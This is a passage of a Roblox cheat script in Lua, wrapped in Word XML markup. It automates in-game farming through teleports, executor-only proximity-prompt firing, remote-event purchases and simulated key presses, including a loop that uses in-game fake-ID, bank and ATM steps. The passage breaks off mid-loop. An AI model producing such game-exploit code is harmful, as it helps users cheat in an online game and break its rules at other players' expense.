    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                until LocalPlayer.Backpack:FindFirstChild("Flour")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if not LocalPlayer.Backpack:FindFirstChild("Potato") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                repeat task.wait(2)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                ReplicatedStorage:WaitForChild("RemoteEvents"):WaitForChild("StorePurchase"):FireServer("Potato")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                until LocalPlayer.Backpack:FindFirstChild("Potato")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</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        repeat task.wait() until LocalPlayer.Backpack:FindFirstChild("Potato") and LocalPlayer.Backpack:FindFirstChild("Flour")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.wait(3)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Teleport_Status = Teleport(CFrame.new(-479, 4, -437), Owns_Bike)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        repeat task.wait() until Teleport_Status == "Success"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.wait(3)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        LocalPlayer.Character.Humanoid:MoveTo(Vector3.new(-479, 4, -437))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fireproximityprompt(Workspace.Map.Locations["The Laboratory"].Prompts.Clipboard.ProximityPrompt)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.wait(2)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local CookingBoard = GetCuttingBoard()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        LocalPlayer.Character.Humanoid:MoveTo(CookingBoard.Part.Position)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if not LocalPlayer.Character:FindFirstChild("Potato") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            LocalPlayer.Character.Humanoid:EquipTool(LocalPlayer.Backpack:FindFirstChild("Potato"))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.wait(2)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        fireproximityprompt(CookingBoard:FindFirstChildWhichIsA("ProximityPrompt", true))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.wait(3)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        LocalPlayer.Character.Humanoid:MoveTo(Vector3.new(-463, 4, -473))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fireproximityprompt(Workspace.Map.Locations["The Laboratory"].Prompts["Plastic Bag"].Attachment.ProximityPrompt)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.wait(1.5)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        LocalPlayer.Character.Humanoid:MoveTo(Vector3.new(-466, 4, -474))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LocalPlayer.Character.Humanoid:MoveTo(Vector3.new(-466, 4, -522))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local Bowl = GetBowl()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        LocalPlayer.Character.Humanoid:MoveTo(Bowl.CamPart.Position)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if not LocalPlayer.Character:FindFirstChild("Flour") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            LocalPlayer.Character.Humanoid:EquipTool(LocalPlayer.Backpack:FindFirstChild("Flour"))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.wait(1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        fireproximityprompt(Bowl.ProximityPrompt)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.wait(5)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        LocalPlayer.Character.Humanoid:MoveTo(Vector3.new(-466, 4, -518))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LocalPlayer.Character.Humanoid:MoveTo(Vector3.new(-467, 4, -470))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local Pot = GetPot()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        LocalPlayer.Character.Humanoid:MoveTo(Pot.Position)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fireproximityprompt(Pot.ProximityPrompt)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.wait(5)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        repeat task.wait(1) until Pot.Timer.TextLabel.Text == "0"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        fireproximityprompt(Pot.ProximityPrompt)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        PressKey(Enum.KeyCode.W, .25) task.wait(.25)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        PressKey(Enum.KeyCode.S, .25) task.wait(.25)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        PressKey(Enum.KeyCode.A, .25) task.wait(.25)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        PressKey(Enum.KeyCode.D, .25) task.wait(.25)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        repeat task.wait() until LocalPlayer.Backpack:FindFirstChild("Potato Chips")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Teleport_Status = Teleport(Workspace.NPCs:FindFirstChild("Poor Guy").Head.CFrame)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        repeat task.wait() until Teleport_Status == "Success"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.wait(3)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        LocalPlayer.Character.Humanoid:MoveTo(Workspace.NPCs:FindFirstChild("Poor Guy").Head.Position)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        LocalPlayer.Character.Humanoid.MoveToFinished:Wait()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        fireproximityprompt(Workspace.NPCs["Poor Guy"].UpperTorso.ProximityPrompt)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.wait(1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.wait(12.5)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local Hobo = Get_Hobo()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if not Hobo then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            repeat wait(1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                Hobo = Get_Hobo()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            until Hobo ~= nil</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Teleport_Status = Teleport(Hobo.Head.CFrame)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        repeat task.wait() until Teleport_Status == "Success" and tp_debounce == false</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.wait(5)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        PressKey(Enum.KeyCode.W, .25) task.wait(.25)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        PressKey(Enum.KeyCode.S, .25) task.wait(.25)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        PressKey(Enum.KeyCode.A, .25) task.wait(.25)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        PressKey(Enum.KeyCode.D, .25) task.wait(.25)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.wait(1.25)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if not LocalPlayer.Character:FindFirstChild("Hot Chips") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            LocalPlayer.Character.Humanoid:EquipTool(LocalPlayer.Backpack:FindFirstChild("Hot Chips"))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        LocalPlayer.Character.Humanoid:MoveTo(Hobo:FindFirstChild("RightLowerLeg", true).Position)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        LocalPlayer.Character.Humanoid.MoveToFinished:Wait()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.wait(4)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local prompt = Hobo:FindFirstChildWhichIsA("ProximityPrompt", true)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        fireproximityprompt(prompt)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.wait(5)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end))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Stop_ChipFarm = LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if not ChipFarm_Thread then return end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if coroutine.status(ChipFarm_Thread) == "suspended" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    task.cancel(ChipFarm_Thread)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 CardFarm_Thread</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Start_CardFarm = function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                CardFarm_Thread = task.spawn(LPH_JIT_MAX(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    while task.wait(1) do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if not Config.South_Bronx.FarmingUtilities.CardFarm then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if not LocalPlayer.Character then continue end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if Config.South_Bronx.TeleportMethod ~= "Tween" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if playerHasCard == false then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                if not LocalPlayer.Backpack:FindFirstChild("Fake ID") and not LocalPlayer.Character:FindFirstChild("Fake ID") and not LocalPlayer.Backpack:FindFirstChild("Card") and not LocalPlayer.Character:FindFirstChild("Card") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    local Teleport_Status = Teleport(CFrame.new(219, 4, -332))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    repeat RunService.RenderStepped:Wait() until Workspace.NPCs:FindFirstChild("FakeIDSeller")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    repeat RunService.RenderStepped:Wait() fireproximityprompt(Workspace.NPCs.FakeIDSeller.UpperTorso.Attachment:FindFirstChild("ProximityPrompt")) until LocalPlayer.Backpack:FindFirstChild("Fake ID") or LocalPlayer.Character:FindFirstChild("Fake ID")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    repeat RunService.RenderStepped:Wait() until Teleport_Status == "Success"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    task.wait(1.5)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    repeat RunService.RenderStepped:Wait() if LocalPlayer.Backpack:FindFirstChild("Fake ID") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        pcall(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            LocalPlayer.Character.Humanoid:EquipTool(LocalPlayer.Backpack:FindFirstChild("Fake ID"))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    until LocalPlayer.Character:FindFirstChild("Fake ID")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                if not LocalPlayer.Backpack:FindFirstChild("Card") and not LocalPlayer.Character:FindFirstChild("Card") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    local Teleport_Status = Teleport(CFrame.new(-49, 4, -323))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    repeat RunService.RenderStepped:Wait() until Workspace.NPCs:FindFirstChild("Bank Teller")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    repeat RunService.RenderStepped:Wait() until Teleport_Status == "Success"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    LocalPlayer.Character.Humanoid:MoveTo(Vector3.new(-49, 4, -321))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    task.wait(2.1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    local Application_Successful = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    local Old ; Old = LocalPlayer.PlayerGui.Main.Message.Warning:GetPropertyChangedSignal("Text"):Connect(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        if not LocalPlayer.PlayerGui.Main.Message.Warning.Text:find("application") then return end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        if LocalPlayer.PlayerGui.Main.Message.Warning.Text == "Your application was successful. Please allow 30 seconds for the bank to prepare your card." then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            Application_Successful = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            playerHasCard = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            Application_Successful = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            playerHasCard = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    repeat RunService.RenderStepped:Wait() if LocalPlayer.Backpack:FindFirstChild("Fake ID") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        pcall(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                            LocalPlayer.Character.Humanoid:EquipTool(LocalPlayer.Backpack:FindFirstChild("Fake ID"))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    until LocalPlayer.Character:FindFirstChild("Fake ID")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    repeat RunService.RenderStepped:Wait() until Workspace.NPCs:FindFirstChild("Bank Teller")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    repeat fireproximityprompt(Workspace.NPCs:FindFirstChild("Bank Teller").UpperTorso.Attachment:FindFirstChild("ProximityPrompt")) task.wait() until not LocalPlayer.Character:FindFirstChild("Fake ID")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    task.wait(1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    LocalPlayer.PlayerGui.Main.Message.Warning:GetPropertyChangedSignal("Text"):Wait()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    task.spawn(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        task.wait(3)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        Old:Disconnect()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    task.wait(.5)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    if Application_Successful == false then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        continue</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    task.wait(1.5)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    LocalPlayer.Character.Humanoid:MoveTo(Vector3.new(-43, 4, -332))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    task.wait(1.5)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    repeat RunService.RenderStepped:Wait() fireproximityprompt(Workspace.Blank.Attachment.ProximityPrompt) until LocalPlayer.Backpack:FindFirstChild("Card")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    playerHasCard = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                local Teleport_Status = Teleport(CFrame.new(-49, 4, -323))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                repeat RunService.RenderStepped:Wait() until Workspace.NPCs:FindFirstChild("Bank Teller")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                repeat RunService.RenderStepped:Wait() until Teleport_Status == "Success"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                LocalPlayer.Character.Humanoid:MoveTo(Vector3.new(-49, 4, -321))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                task.wait(2.1)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                LocalPlayer.Character.Humanoid:MoveTo(Vector3.new(-43, 4, -332))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                task.wait(1.5)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                repeat RunService.RenderStepped:Wait() fireproximityprompt(Workspace.Blank.Attachment.ProximityPrompt) until LocalPlayer.Backpack:FindFirstChild("Card")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                playerHasCard = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if not LocalPlayer.Backpack:FindFirstChild("Card") and not LocalPlayer.Character:FindFirstChild("Card") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                continue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local ATM;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            for Index, Value in Workspace.Map.ATMS:GetChildren() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                if Value.ATMScreen.Transparency == 0 then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    ATM = Value</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    break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if ATM == nil then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                repeat RunService.RenderStepped:Wait()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                for Index, Value in Workspace.Map.ATMS:GetChildren() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    if Value.ATMScreen.Transparency == 0 then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
